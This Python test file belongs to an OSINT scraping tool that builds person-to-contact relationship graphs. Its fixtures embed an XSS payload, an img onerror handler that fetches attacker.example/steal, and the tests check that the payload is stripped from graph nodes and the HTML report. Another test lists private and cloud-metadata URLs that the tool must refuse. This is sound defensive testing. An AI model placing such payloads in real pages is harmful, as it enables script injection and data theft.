import time

from src.domain.graph import build_adjacency_index, build_relation_graph, filter_relation_graph
from src.domain.layout import layout_graph
from src.domain.normalize import normalize_email, normalize_phone, process_record
from src.domain.url_guard import is_public_http_url
from src.infrastructure.report_html import render_report_html
from src import osint_helper


XSS = "<img src=x onerror=\"fetch('http://attacker.example/steal')\">"


def fixture_rows():
    return [
        {
            "SourceURL": "https://example.com/athlete/ada",
            "Entities": {
                "phones": ["(555) 010-0199", "9999999999999"],
                "emails": ["Ada@Example.com"],
                "metadata": [
                    "json_ld.names: Ada Lovelace",
                    "json_ld.address: 1 Example Street",
                    "json_ld.school: Example High School",
                    f"title: Coach {XSS} Lovelace",
                    "og:description: Attention Required! | Cloudflare",
                ],
            },
        },
        {
            "SourceURL": "https://example.org/p/ada",
            "Entities": {
                "phones": ["+1 555-010-0199"],
                "metadata": [
                    "robots: noindex, noodp",
                    "headline: Sign up | LinkedIn",
                ],
            },
        },
        {
            "SourceURL": "https://example.net/person",
            "Entities": {"metadata": ["breadcrumb: Home > People"]},
        },
        {
            "SourceURL": "https://challenges.cloudflare.com/cdn-cgi",
            "Entities": {"metadata": ["title: Attention Required! | Cloudflare"]},
        },
    ]


def test_normalizer_accepts_e164_and_drops_long_ids_and_noise():
    assert normalize_phone("(555) 010-0199") == "+15550100199"
    assert normalize_phone("9999999999999") is None
    assert normalize_phone("15551212") is None
    assert normalize_phone("1" * 16) is None
    assert normalize_email("Ada@Example.com") == "ada@example.com"
    assert normalize_email("not-an-email") is None

    phone = process_record("example.com", "phones", "(555) 010-0199")
    assert phone is not None
    assert phone.type == "PHONE"
    assert phone.value == "+15550100199"
    assert phone.confidence == 0.95
    assert process_record("example.net", "phones", "9999999999999") is None
    assert process_record("x", "title", "Attention Required! | Cloudflare") is None
    assert process_record("x", "headline", "Sign up | LinkedIn") is None
    assert process_record("x", "robots", "noodp, noindex") is None

    person = process_record("example.com", "json_ld.names", f"Ada {XSS} Lovelace")
    assert person is not None
    assert person.type == "PERSON"
    assert person.value == "Ada Lovelace"
    assert person.confidence == 0.85
    assert "<" not in person.value
    address = process_record("example.com", "json_ld.address", "1 Example Street")
    assert address.type == "ADDRESS" and address.confidence == 0.90
    org = process_record("example.com", "json_ld.school", "Example High School")
    assert org.type == "ORGANIZATION" and org.confidence == 0.80


def test_fixture_graph_is_canonical_and_phone_filter_has_no_orphans():
    graph = build_relation_graph(fixture_rows())
    phones = [node for node in graph.nodes if node.type == "PHONE"]
    assert len(phones) == 1
    phone = phones[0]
    assert phone.value == "+15550100199"
    assert phone.id == "PHONE:+15550100199"
    assert phone.confidence == 0.95
    phone_edges = [edge for edge in graph.edges if edge.target == phone.id]
    assert {edge.relation for edge in phone_edges} == {"HAS_PHONE"}
    assert {edge.source for edge in phone_edges} == {"DOMAIN:example.com", "DOMAIN:example.org"}
    assert any(edge.relation == "RESIDED_AT" for edge in graph.edges)
    assert any(node.type == "EMAIL" and node.value == "ada@example.com" and node.confidence == 0.98 for node in graph.nodes)
    assert any(node.type == "PERSON" and node.confidence == 0.85 for node in graph.nodes)
    assert any(node.type == "ADDRESS" and node.confidence == 0.90 for node in graph.nodes)
    blob = " ".join(node.label for node in graph.nodes) + " ".join(node.value for node in graph.nodes)
    assert "9999999999999" not in blob
    assert "Attention Required" not in blob
    assert "Sign up | LinkedIn" not in blob
    assert "noindex" not in blob.lower()
    assert "noodp" not in blob.lower()
    assert "attacker.example" not in blob
    assert "<img" not in blob.lower()
    assert all(node.type != "DOMAIN" or node.id.startswith("DOMAIN:") for node in graph.nodes)
    assert not any(node.label == "challenges.cloudflare.com" for node in graph.nodes)

    index = graph.index or build_adjacency_index(graph.edges)
    assert set(index["edgeToNodes"][phone_edges[0].id]) == {phone_edges[0].source, phone_edges[0].target}
    assert phone.id in index["nodeToEdges"]
    assert phone_edges[0].id in index["nodeToEdges"][phone.id]

    view = filter_relation_graph(graph, category="PHONE")
    view_ids = {node.id for node in view.nodes}
    assert phone.id in view_ids
    assert "DOMAIN:example.com" in view_ids
    assert "DOMAIN:example.org" in view_ids
    assert "DOMAIN:example.net" not in view_ids
    linked = set()
    for edge in view.edges:
        linked.add(edge.source)
        linked.add(edge.target)
        assert edge.relation == "HAS_PHONE"
    assert view_ids == linked
    again = build_relation_graph(fixture_rows())
    assert [node.id for node in graph.nodes] == [node.id for node in again.nodes]


def test_private_urls_are_refused_and_public_https_is_allowed():
    assert is_public_http_url("http://127.0.0.1/admin") is False
    assert is_public_http_url("http://127.0.0.1:8080/") is False
    assert is_public_http_url("http://localhost/secret") is False
    assert is_public_http_url("http://10.1.2.3/x") is False
    assert is_public_http_url("http://192.168.1.9/") is False
    assert is_public_http_url("http://172.16.0.4/") is False
    assert is_public_http_url("http://169.254.169.254/latest/meta-data") is False
    assert is_public_http_url("http://[::1]/") is False
    assert is_public_http_url("https://example.com/athlete") is True
    assert is_public_http_url("https://example.com/a") is True
    assert is_public_http_url("ftp://example.com/a") is False


def test_extraction_on_a_long_digit_dump_finishes_quickly():
    blob = ("1-2.3 (4) " * 2500)
    assert len(blob) >= 20000
    started = time.perf_counter()
    found = osint_helper.extract_entities(blob)
    elapsed = time.perf_counter() - started
    assert elapsed < 2
    assert "9999999999999" not in found.get("phones", [])
    assert osint_helper.normalize_phone("(555) 010-0199") == "+15550100199"


def test_rendered_fixture_has_no_live_xss_tag():
    html = render_report_html(build_relation_graph(fixture_rows()), title="OSINT Relationship Map")
    assert "<img" not in html.lower()
    assert "attacker.example" not in html
    assert "onerror=" not in html.lower()
    assert "+15550100199" in html
    assert "example.com" in html


def test_layout_spreads_nodes_across_the_pane():
    graph = build_relation_graph(fixture_rows())
    positions = layout_graph(graph.nodes, graph.edges, 1000, 800)
    assert len(positions) == len(graph.nodes)
    xs = [point[0] for point in positions.values()]
    ys = [point[1] for point in positions.values()]
    assert max(xs) - min(xs) > 600
    assert max(ys) - min(ys) > 400
    assert all(0 <= x <= 1000 and 0 <= y <= 800 for x, y in positions.values())
